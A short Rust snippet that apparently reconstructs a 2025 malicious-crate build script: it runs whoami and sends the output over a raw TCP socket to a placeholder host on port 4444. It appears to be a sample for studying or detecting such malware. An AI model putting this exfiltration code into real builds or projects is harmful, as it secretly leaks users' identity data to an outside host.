// real jfrog_quotes (2025) shape: whoami/hostname at build time, sent over a raw TCP socket
use std::{io::Write, net::TcpStream, process::Command};
fn main() {
    let u = Command::new("whoami").output().map(|o| o.stdout).unwrap_or_default();
    if let Ok(mut s) = TcpStream::connect("192.0.2.1:4444") { let _ = s.write_all(&u); }
}
